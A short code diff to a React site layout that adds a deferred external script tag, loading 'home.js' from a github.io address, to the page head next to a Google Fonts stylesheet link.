@@ -50,6 +50,7 @@ export default async function SiteLayout({ children }: { children: React.ReactNo
           rel="stylesheet"
           href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+KR:wght@400;500;600;700&family=Noto+Sans+KR:wght@700;900&family=Unbounded:wght@700&display=swap"
         />
+        <script src="https://humgut1.github.io/home.js" defer />
       </head>
       <body className="site">
         <header className="s-top">
